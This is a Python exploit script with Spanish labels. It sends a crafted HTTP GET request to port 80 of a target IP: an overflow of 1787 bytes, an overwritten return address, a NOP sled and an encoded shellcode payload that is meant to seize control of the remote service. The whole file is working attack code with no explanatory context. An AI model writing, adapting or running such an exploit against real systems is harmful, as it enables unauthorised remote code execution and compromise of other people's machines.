import sys, socket
from pwn import *

inicio_buffer = "GET "
offset = 1787
EIP = "\x71\xE8\x84\x77"

shellcode =  b""
shellcode += b"\xb8\xf7\xb2\xe0\x48\xd9\xeb\xd9\x74\x24\xf4"
shellcode += b"\x5b\x29\xc9\xb1\x5e\x83\xeb\xfc\x31\x43\x11"
shellcode += b"\x03\x43\x11\xe2\x02\x4e\x08\xc7\xec\xaf\xc9"
shellcode += b"\xb8\x65\x4a\xf8\xea\x11\x1e\xa9\x3a\x52\x72"
shellcode += b"\x42\xb0\x36\x67\x55\x71\xfc\xa1\xe2\x0f\x28"
shellcode += b"\x9f\x0b\xde\xe8\x73\xcf\x40\x94\x89\x1c\xa3"
shellcode += b"\xa5\x41\x51\xa2\xe2\x17\x1f\x4b\xbe\xf0\x54"
shellcode += b"\xc1\x2e\x74\x28\xda\x4f\x5a\x26\x62\x37\xdf"
shellcode += b"\xf9\x17\x8b\xde\x29\x87\x98\xb9\xe9\x29\x4d"
shellcode += b"\xb2\xa2\x31\xf4\x0c\x46\x7e\xbf\x05\x93\xf5"
shellcode += b"\x0e\xe5\xdd\xdf\x41\xd9\x1f\x10\xac\x75\x9e"
shellcode += b"\x68\x96\x65\xd4\x82\xe5\x18\xef\x50\x94\xc6"
shellcode += b"\x7a\x47\x3e\x8c\xdd\xa3\xbf\x41\xbb\x20\xb3"
shellcode += b"\x2e\xcf\x6f\xd7\xb1\x1c\x04\xe3\x3a\xa3\xcb"
shellcode += b"\x62\x78\x80\xcf\x2f\xda\xa9\x56\x95\x8d\xd6"
shellcode += b"\x89\x71\x71\x73\xc1\x93\x64\x03\x2a\x6c\x89"
shellcode += b"\x59\xbd\xa1\x44\x62\x3d\xad\xdf\x11\x0f\x72"
shellcode += b"\x74\xbe\x23\xfb\x52\x39\x35\xeb\x64\x95\xfd"
shellcode += b"\x7b\x9b\x16\xfe\x52\x58\x42\xae\xcc\x49\xeb"
shellcode += b"\x25\x0c\x75\x3e\xd3\x06\xe1\x01\x8c\x17\xed"
shellcode += b"\xe9\xcf\x17\x77\x83\x46\xf1\xd7\x03\x09\xad"
shellcode += b"\x97\xf3\xe9\x1d\x70\x1e\xe6\x42\x60\x21\x2c"
shellcode += b"\xeb\x0b\xce\x99\x44\xa4\x77\x80\x1e\x55\x77"
shellcode += b"\x1e\x5b\x55\xf3\xab\x9c\x18\xf4\xde\x8e\x4d"
shellcode += b"\x63\x21\x4e\x8e\x06\x21\x24\x8a\x80\x76\xd0"
shellcode += b"\x90\xf5\xb1\x7f\x6a\xd0\xc1\x87\x94\xa5\xf3"
shellcode += b"\xfc\xa3\x33\xbc\x6a\xcc\xd3\x3c\x6a\x9a\xb9"
shellcode += b"\x3c\x02\x7a\x9a\x6e\x37\x85\x37\x03\xe4\x10"
shellcode += b"\xb8\x72\x59\xb2\xd0\x78\x84\xf4\x7e\x82\xe3"
shellcode += b"\x86\x79\x7c\x76\xa1\x21\x15\x88\xf1\xd1\xe5"
shellcode += b"\xe2\xf1\x81\x8d\xf9\xde\x2e\x7e\x02\xf5\x66"
shellcode += b"\x16\x89\x98\xc5\x87\x8e\xb0\x88\x19\x8f\x37"
shellcode += b"\x11\xa9\xea\x38\xa6\x4a\x0b\x51\xc3\x4a\x0c"
shellcode += b"\x5d\xf5\x77\xdb\x64\x83\xb6\xd8\xd2\x8c\x24"
shellcode += b"\xf4\x2e\x25\xf1\x9d\x92\x28\x02\x48\xd0\x54"
shellcode += b"\x81\x78\xa9\xa2\x99\x09\xac\xef\x1d\xe2\xdc"
shellcode += b"\x60\xc8\x04\x72\x80\xd9"

NOPs = "\x90" * 8
final_buffer = "HTTP/1.1\r\n\r\n"

payload = inicio_buffer + "\x41" * offset + EIP +  NOPs + shellcode +  final_buffer

def mostrar_uso():
    print "\n[i] Uso: python "+sys.argv[0]+" <IP>\n"
    sys.exit(1)

if __name__ == '__main__':
    if len(sys.argv) != 2:
        mostrar_uso()
    ip = sys.argv[1]
    puerto = 80
    progreso = log.progress("")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip, puerto))
    progreso.status("Enviando Buffer Malicioso de "+str(len(payload))+" bytes")
    sock.send(payload)
    sock.recv(1024)
    
    